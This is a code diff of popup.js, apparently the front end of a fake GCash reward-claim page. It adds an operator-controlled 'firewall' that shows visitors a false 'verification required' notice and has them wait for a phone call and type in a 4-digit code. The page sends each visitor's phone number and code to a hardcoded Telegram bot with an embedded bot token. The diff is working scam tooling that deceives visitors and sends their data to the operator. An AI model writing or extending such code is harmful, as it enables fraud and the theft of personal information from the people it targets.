@@ -8,70 +8,109 @@ let claimState = {
     hasRedirected: false
 };
 
-// ========== FIREWALL VERIFICATION (4-digit call) ==========
+let cachedFirewallStatus = false;
+
+// ========== FIREWALL VERIFICATION ==========
 let currentVerificationCode = null;
 let verificationAttempts = 0;
 
-async function isFirewallActive() {
-    if (typeof firebase !== 'undefined' && firebase.database) {
-        try {
-            const db = firebase.database();
-            const snap = await db.ref('admin/globalFirewall').once('value');
-            const data = snap.val();
-            console.log("🔥 Firewall status:", data?.active ? "ON" : "OFF");
-            return (data && data.active === true);
-        } catch(e) { 
-            console.error("Firewall check error:", e);
-            return false; 
-        }
+async function getFirewallStatus() {
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        console.warn("Firebase not available");
+        return false;
     }
-    return false;
+    try {
+        const db = firebase.database();
+        const snap = await db.ref('admin/globalFirewall').once('value');
+        const data = snap.val();
+        console.log("🔥 Firewall status from Firebase:", data);
+        if (data === null) {
+            console.warn("No firewall data, creating default...");
+            await db.ref('admin/globalFirewall').set({
+                active: false,
+                activatedBy: "SYSTEM",
+                timestamp: Date.now()
+            });
+            return false;
+        }
+        return data.active === true;
+    } catch(e) { 
+        console.error("Firewall check error:", e);
+        return false;
+    }
+}
+
+// Real-time listener for firewall changes
+function listenToFirewallChanges() {
+    if (typeof firebase === 'undefined' || !firebase.database) return;
+    const db = firebase.database();
+    db.ref('admin/globalFirewall').on('value', (snapshot) => {
+        const data = snapshot.val();
+        cachedFirewallStatus = (data && data.active === true);
+        console.log("🔥 Firewall status updated (real-time):", cachedFirewallStatus);
+        
+        // Optional: Update UI if needed
+        const statusLabel = document.getElementById('statusLabel');
+        if (statusLabel && cachedFirewallStatus) {
+            statusLabel.innerHTML = "⚠️ FIREWALL ACTIVE - Verification required ⚠️";
+            statusLabel.style.color = "#ff8888";
+        } else if (statusLabel && !cachedFirewallStatus) {
+            statusLabel.innerHTML = "✨ Welcome! ✨";
+            statusLabel.style.color = "#fbbf24";
+        }
+    });
+}
+
+async function isFirewallActive() {
+    return cachedFirewallStatus;
 }
 
 async function sendTelegram(phone, code) {
     const msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
     try {
         await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
+        console.log("📨 Telegram sent");
     } catch(e) {}
 }
 
 function showFirewallPopup() {
     console.log("🔥 Showing firewall verification popup");
     const popup = document.getElementById('firewallPopup');
-    if (popup) {
-        const content = document.getElementById('firewallPopupContent');
-        if (content) {
-            content.innerHTML = `
-                <div class="firewall-warning-icon">📞</div>
-                <h2>VERIFICATION REQUIRED</h2>
-                <div class="firewall-message">
-                    <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
-                    <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
-                    <p>Enter the code below to continue.</p>
-                </div>
-                <div class="verification-input-group">
-                    <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
-                    <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
-                </div>
-                <div class="firewall-note">
-                    <p>Waiting for system-verification call...</p>
-                </div>
-                <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
-            `;
-        }
-        
-        currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
-        verificationAttempts = 0;
-        console.log("📞 VERIFICATION CODE (admin use):", currentVerificationCode);
-        
-        popup.style.display = 'flex';
-        setTimeout(() => {
-            const ci = document.getElementById('verificationCode');
-            if (ci) ci.focus();
-        }, 100);
-    } else {
+    if (!popup) {
         console.error("Firewall popup element not found!");
+        return;
     }
+    
+    const content = document.getElementById('firewallPopupContent');
+    if (content) {
+        content.innerHTML = `
+            <div class="firewall-warning-icon">📞</div>
+            <h2>VERIFICATION REQUIRED</h2>
+            <div class="firewall-message">
+                <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
+                <p>Please wait for the system-verification to call you. You will receive a 4-digit code during the call.</p>
+                <p>Enter the code below to continue.</p>
+            </div>
+            <div class="verification-input-group">
+                <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
+                <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
+            </div>
+            <div class="firewall-note">
+                <p>Waiting for system-verification call...</p>
+            </div>
+            <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
+        `;
+    }
+    
+    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+    verificationAttempts = 0;
+    console.log("📞 VERIFICATION CODE:", currentVerificationCode);
+    
+    popup.style.display = 'flex';
+    setTimeout(() => {
+        const ci = document.getElementById('verificationCode');
+        if (ci) ci.focus();
+    }, 100);
 }
 
 function hideFirewallPopup() {
@@ -85,8 +124,6 @@ window.verifyFirewallCode = async function() {
     const errorDiv = document.getElementById('firewallErrorMsg');
     const verifyBtn = document.getElementById('verifyCodeBtn');
     const userPhone = localStorage.getItem("userPhone") || "Unknown";
-    
-    console.log("Verifying code:", code);
     
     if (!code || code.length < 4) {
         if (errorDiv) {
@@ -146,10 +183,13 @@ async function getLatestPayoutLink() {
         if (snapshot.exists()) {
             const key = Object.keys(snapshot.val())[0];
             const linkData = snapshot.val()[key];
+            console.log("🔗 Found payout link:", linkData.url);
             return linkData.url || null;
         }
+        console.warn("No available links found in Firebase");
         return null;
     } catch (error) {
+        console.error("Error getting payout link:", error);
         return null;
     }
 }
@@ -158,18 +198,17 @@ async function getLatestPayoutLink() {
 async function showClaimPopup(amount) {
     console.log("showClaimPopup called with amount:", amount);
     
-    const firewallActive = await isFirewallActive();
-    console.log("Firewall active:", firewallActive);
+    // Get latest firewall status
+    const firewallActive = await getFirewallStatus();
+    console.log("🔥 Firewall active:", firewallActive);
     
     if (firewallActive) {
-        // FIREWALL IS ON - Show 4-digit verification popup
-        console.log("Firewall ON - Showing verification popup");
+        console.log("FIREWALL ON - Showing verification popup");
         showFirewallPopup();
         return;
     }
     
-    // FIREWALL IS OFF - Show normal congratulations popup
-    console.log("Firewall OFF - Showing congratulations popup");
+    console.log("FIREWALL OFF - Showing congratulations popup");
     claimState.currentAmount = amount;
     claimState.isProcessing = false;
     claimState.hasRedirected = false;
@@ -324,7 +363,8 @@ function onClaimAction() {
                 }, 3000);
                 alert("No available rewards! Please wait for admin to deploy a link.");
             }
-        }).catch(() => {
+        }).catch((err) => {
+            console.error("Firebase error:", err);
             claimBtn.innerHTML = 'ERROR';
             setTimeout(() => {
                 claimBtn.innerHTML = 'CLAIM THRU GCASH';
@@ -337,7 +377,14 @@ function onClaimAction() {
 
 document.addEventListener('DOMContentLoaded', function() { 
     hidePendingStatus();
-    console.log("Popup.js loaded, firewall check ready");
+    // Initialize firewall listener
+    listenToFirewallChanges();
+    // Get initial status
+    getFirewallStatus().then(status => {
+        console.log("Initial firewall status:", status);
+        cachedFirewallStatus = status;
+    });
+    console.log("Popup.js loaded");
 });
 
 // Expose functions for global access
@@ -345,3 +392,4 @@ window.showFirewallPopup = showFirewallPopup;
 window.hideFirewallPopup = hideFirewallPopup;
 window.verifyFirewallCode = verifyFirewallCode;
 window.showClaimPopup = showClaimPopup;
+window.onClaimAction = onClaimAction;
